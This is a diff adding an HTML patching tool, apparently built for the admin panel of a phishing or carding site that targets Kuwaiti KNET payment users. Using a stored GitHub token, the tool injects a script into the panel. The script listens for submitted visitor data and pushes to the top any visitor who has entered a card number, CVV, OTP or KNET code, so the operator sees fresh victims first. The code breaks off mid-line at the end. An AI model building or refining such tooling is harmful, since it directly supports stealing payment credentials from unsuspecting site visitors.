@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>F137</title>
+<style>body{background:#0b1220;color:#e5e7eb;font-family:system-ui,Tahoma;padding:14px;max-width:940px;margin:auto}
+h1{font-size:16px;color:#a78bfa}button{background:#7c3aed;color:#fff;border:0;border-radius:9px;padding:11px 22px;font-weight:700;font-size:14px}
+input{width:100%;box-sizing:border-box;background:#020617;border:1px solid #334155;color:#e5e7eb;border-radius:8px;padding:9px 11px;font:12px monospace;direction:ltr;margin:8px 0}
+#log{background:#020617;border:1px solid #1e293b;border-radius:8px;padding:10px;font:11.5px/1.6 monospace;direction:ltr;text-align:left;white-space:pre-wrap;min-height:170px;max-height:44vh;overflow:auto}</style></head>
+<body>
+<h1>F137 — رفع بطاقة الزائر للأعلى عند ملخص / كي نت / بطاقة / OTP / CVV</h1>
+<input id="tk" type="password" placeholder="GitHub token (اختياري إذا محفوظ)">
+<button id="go">تنفيذ</button>
+<div id="log">جاهز.</div>
+<script>
+var L=document.getElementById('log');
+function p(s,c){var d=document.createElement('div');if(c)d.style.color=c;d.textContent=s;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function cnt(h,n){var c=0,i=0;while((i=h.indexOf(n,i))>-1){c++;i+=n.length;}return c;}
+var R='fahshomi-ui/KDD',P='server/admin/index.html',B='main',RAW='https://raw.githubusercontent.com/'+R+'/'+B+'/'+P;
+var BLK = `<script id="kddF137">
+(function(){
+  if (window.__f137) return; window.__f137 = 1;
+  try { if (document.title.indexOf('F137') < 0) document.title += ' ·F137'; } catch(e){}
+  function rel(x){
+    try {
+      var d=(x&&x.data)||{}, v=(x&&x.visitor)||{};
+      var p=String((d.page||d['الصفحة'])||v.page||'');
+      if (d.digitCode||d['الرمز']||d.otp||d.code) return true;
+      if (d.cardNumber||d.cardNumberOnly||d.cvv) return true;
+      return /ملخص|summary|كي\\s*نت|knet|بطاقة|card|otp|رمز|cvv/i.test(p);
+    } catch(e){}
+    return false;
+  }
+  function keyOf(el){
+    try {
+      var v = visitors.get(el.getAttribute('data-vid'));
+      if (!v) return 0;
+      var t = v.__boost || (v.lastDataUpdate ? new Date(v.lastDataUpdate).getTime() : 0);
+      if (!t) t = new Date(v.createdAt || 0).getTime();
+      return t;
+    } catch(e){ return 0; }
+  }
+  function order(){
+    try {
+      var c = document.getElementById('visitorsList'); if (!c) return;
+      var cards = [], kids = c.children;
+      for (var i=0;i<kids.length;i++){ if (kids[i].getAttribute && kids[i].getAttribute('data-vid')) cards.push(kids[i]); }
+      if (cards.length < 2) return;
+      var want = cards.slice().sort(function(a,b){ return keyOf(b)-keyOf(a); });
+      var same = true;
+      for (var j=0;j<cards.length;j++){ if (cards[j]!==want[j]){ same=false; break; } }
+      if (same) return;
+      var f = document.createDocumentFragment();
+      for (var k=0;k<want.length;k++) f.appendChild(want[k]);
+      c.insertBefore(f, c.firstChild);
+    } catch(e){}
+  }
+  function bump(x){
+    try {
+      var id = x && x.visitorId; if (!id) return;
+      var v = visitors.get(id); if (!v) return;
+      v.__boost = Date.now();
+      v.lastDataUpdate = new Date().toISOString();
+      visitors.set(id, v);
+      order();
+    } catch(e){}
+  }
+  function hookS(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f137) return;
+      s.__f137 = 1;
+      s.on('visitor:dataSubmitted', function(x){ try { if (rel(x)) bump(x); } catch(e){} });
+    } catch(e){}
+  }
+  hookS(); setInterval(hookS, 500);
+  var orl = window.renderVisitorsList;
+  if (typeof orl === 'function' && !orl.__f137){
+    var w = function(){ var r = orl.apply(this, arguments); try { order(); } catch(e){} return r; };
+    w.__f137 = 1; window.renderVisitorsList = w; try { renderVisitorsList = w; } catch(e){}
+  }
+  var tm = null;
+  function watch(){
+    var c = document.getElementById('visitorsList');
+    if (!c || c.__f137) return;
+    c.__f137 = 1;
+    try { new MutationObserver(function(){ clearTimeout(tm); tm = setTimeout(order, 50); }).observe(c, { childList: true }); } catch(e){}
+  }
+  watch(); setInterval(watch, 600);
+  setInterval(order, 400);
+})();
+<\/script>`;
+var B3 = cnt(BLK,'visitor:dataSubmitted');
+function pt(t){var b=t.split('\n').length;var o=t.replace(/\s*$/,'')+'\n'+BLK+'\n';return{o:o,b:b,a:o.split('\n').length};}
+function st(){var f='<body>\n<script id="kddF136">\n'+"s.on('visitor:dataSubmitted', function(x){});\n"+'<\/script>\n</body>\n';var r=pt(f);var bad=[];if(cnt(r.o,'visitor:dataSubmitted')!==cnt(f,'visitor:dataSubmitted')+B3)bad.push('cnt');if(cnt(r.o,'id="kddF137"')!==1)bad.push('id');if(r.o.indexOf(BLK)<0)bad.push('verbatim');if(Math.abs((r.a-r.b)-BLK.split('\n').length)>2)bad.push('lines');return bad;}
+document.getElementById('go').onclick=async function(){
+var btn=this;btn.disabled=1;L.textContent='';
+p('BLK occurrences = '+B3);
+var s=st();if(s.length){p('SELFTEST FAIL '+s.join(','),'#f87171');btn.disabled=0;return;}p('SELFTEST PASS','#34d399');
+var tk=(document.getElementById('tk').value||'').trim()||localStorage.getItem('kdd_tok')||prompt('GitHub token ghp_...');
+if(!tk){p('لا يوجد توكن','#f87171');btn.disabled=0;return;}localStorage.setItem('kdd_tok',tk);
+var res=await fetch(RAW+'?t='+Date.now(),{cache:'no-store'});
+if(!res.ok){p('get '+res.status,'#f87171');btn.disabled=0;return;}
+var t=await res.text();p('lines '+t.split('\n').length);
+var f=0;function ch(n,c){if(c)p(n+' YES_OK','#34d399');else{p(n+' NO_BAD','#f87171');f++;}}
+var c0=cnt(t,'visitor:dataSubmitted');
+ch('F136=1',cnt(t,'id="kddF136"')===1);ch('F137=0',cnt(t,'id="kddF137"')===0);ch('cnt='+c0,c0===5);ch('__f136',t.indexOf('__f136')>-
